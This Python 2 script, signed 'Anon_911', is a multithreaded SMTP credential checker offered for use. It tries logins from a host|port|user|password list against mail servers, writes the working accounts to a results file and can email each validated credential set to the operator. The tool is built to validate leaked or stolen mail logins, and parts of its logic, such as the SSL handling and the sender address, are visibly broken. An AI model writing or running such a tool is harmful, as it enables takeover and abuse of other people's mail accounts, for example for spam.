# -*- coding: utf-8 -*-
#AUTHOR: Mike Will  A.K.A : Anon_911


## if u try to edit credits F*ck u / P*ta madre / n*que ta mere / what else ?


import smtplib,sys,os,tkMessageBox,Tkinter,time,threading,socket
from colorama import init
from termcolor import colored
from queue import Queue

init()
root = Tkinter.Tk()
root.withdraw()
logo = '''
     _                         ___  _ _ 
    / \   _ __   ___  _ __    / _ \/ / |
   / _ \ | '_ \ / _ \| '_ \  | (_) | | |
  / ___ \| | | | (_) | | | |  \__, | | |
 /_/   \_\_| |_|\___/|_| |_|    /_/|_|_| V1.2

          FB : fb.com/An0n.htmll
          Telegram : @AnonPhP
          Email : michael.wil1iams@yandex.com
          
© All Rights reserved to Anon 911
                                        
'''
def check(target):
   global live,dead,receiver_email,sendmail
   t=target.split("|")
   host=t[0]
   port=int(t[1])
   user=t[2]
   pwd=t[3]
   ssl=t[4]
   print '[!] Checking %s'%host
   try:
      time.sleep(1)
      if ssl.lower() == 'y':
         s = smtplib.SMTP_SSL(host,port, timeout=5)
      s = smtplib.SMTP(host,port, timeout=5)
      s.ehlo()
      s.starttls()
      s.ehlo()
      s.login(user,pwd)
      save=open('result\Anon_911 checked.txt','a+').write("{0}:{1}|{2}|{3}|SSL={4}\n".format(host,port,user,pwd,ssl))
      live+=1
      os.system('title ' + '~ Anon_911 ~ SMTP CHECKER .. [LIVE :  {} ] [DEAD : {}]'.format(live, dead))
      print('['+colored('+','green')+'] {} == > '+colored('LIVE !!\n','green')+'').format(host)
      if sendmail is True:
         message = """\
Subject:Anon_911 : New SMTP (1) !


SMTP WORK  !!!!

HOST : {0}
PORT : {1}
USER : {2}
PWD : {3}
SSL/TLS : {4}



~Anon_911
""".format(host,port,user,pwd,ssl)
         if '@' not in user:
            sender_email = "{}@{}".format(user,host)
         sender_email = user
         s.sendmail(sender_email, receiver_email, message)
      s.quit()
   except smtplib.SMTPAuthenticationError:
      dead+=1
      os.system('title ' + '~ Anon_911 ~ SMTP CHECKER .. [LIVE :  {} ] [DEAD : {}]'.format(live, dead))
      print('['+colored('-','red')+'] {} == > '+colored('Incorrect login/password\n','red')+'').format(host)
   except (socket.error,smtplib.SMTPServerDisconnected):
      dead+=1
      os.system('title ' + '~ Anon_911 ~ SMTP CHECKER .. [LIVE :  {} ] [DEAD : {}]'.format(live, dead))
      print('['+colored('-','red')+'] {} == > '+colored('Unable to connect\n','red')+'').format(host)
   except smtplib.SMTPException as e:
      save=open('result\sender address issue.txt','a+').write("{0}:{1}|{2}|{3}|SSL={4} ==> {5}\n".format(host,port,user,pwd,ssl,e))
      pass
   except Exception as e:
      tkMessageBox.showerror("Crash 404", "Script Crashed !!! \n Please re-Check ur entries")
      save=open('error_log','a+').write(str(e)+'\n')
      sys.exit(e)
   
def threader():
   while True:
      try:
         smtp = q.get()
         check(smtp)
         q.task_done()
      except ValueError:
         tkMessageBox.showerror("Error", "Invalid  list FORMAT\n HOST|PORT|USER|PWD|SSL Y OR N\N e.g : smtp.google.com|465|user|pwd|Y \n ~Anon_911")
      except Exception as e:
         tkMessageBox.showerror("Crash 404", "Script Crashed !!! \n Please re-Check ur entries")
         ave=open('error_log','a+').write(str(e)+'\n')
         sys.exit(e)


print (colored(logo,'blue'))
smtplist=raw_input(''+colored('ENTER','blue')+' '+colored('YOUR','white')+' '+colored('LIST','red')+' ==> ')
question=raw_input('Do You Want to Test Sending ? y/n :')
if question.lower() == 'y':
   receiver_email=raw_input(''+colored('ENTER','blue')+' '+colored('YOUR','white')+' '+colored('EMAIL','red')+' ==> ')
   sendmail=True
else:
   receiver_email=None
   sendmail=False
   pass
try:
   threads=int(raw_input('Threads ==> '))
   open(smtplist,'r')
   if os.path.exists('result') is False:
      os.mkdir('result')
   
except ValueError:
   tkMessageBox.showerror("Error", "Invalid Threads number")
   sys.exit('['+colored('!','yellow')+'] Invalid Threads number')
except Exception as e:
   tkMessageBox.showerror("Error", "%s is EMPTY/NOT FOUND\n"%smtplist)
   sys.exit('['+colored('!','yellow')+'] {} is EMPTY/NOT FOUND\n {}'.format(smtplist,e))
q = Queue()
with open(smtplist,'r') as smtps:
   live=0
   dead=0
   print (str("#"*10)+"[CHECKING STARTED]"+str("#"*10)+"\n")
   for x in range(threads):
      t = threading.Thread(target=threader)
      t.daemon = True
      t.start()
   for line in smtps:
      q.put(line)
      
   q.join()
            
   tkMessageBox.showinfo("DONE", "%s SMTPs are working ! \n Enjoy\n ~Anon_911"%live)
   os.system('title ' + '~ Anon_911 ~ SMTP CHECKER .. [LIVE :  {} ] [DEAD : {}]'.format(live, dead))
